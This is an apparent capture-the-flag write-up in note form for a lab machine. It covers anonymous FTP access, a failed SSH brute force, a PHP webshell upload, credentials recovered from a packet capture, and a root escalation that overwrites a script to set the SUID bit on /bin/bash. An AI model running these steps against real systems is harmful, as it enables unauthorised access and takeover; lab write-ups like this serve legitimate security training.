# 10.10.103.74


# FTP (anonymous)

- found username Maya


# Bruteforce SSH with Maya:rockyou<! --> (didn't work)



# there's an ftp folder and it can be listed with directory browsing. it is also possible to put files in FTP folder


# put a php webshell and catch a shell


# we have access to www-data user. found the receipe



# there's a suspicious.pcapng file (wireshark) - following TCP streams we find some info - (Creds: c4ntg3t3n0ughsp1c3)


# find ssh users:
cat /etc/passwd | grep -i sh | grep -v ssh
root:x:0:0:root:/root:/bin/bash
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash

So now have 3 users and 1 password: c4ntg3t3n0ughsp1c3

try su into these users with the password

# su lennie
c4ntg3t3n0ughsp1c3

get access to lennie's account


printf '#!/bin/bash\nchmod +s /bin/bash' > /etc/print.sh


bin/bash -p


voila 

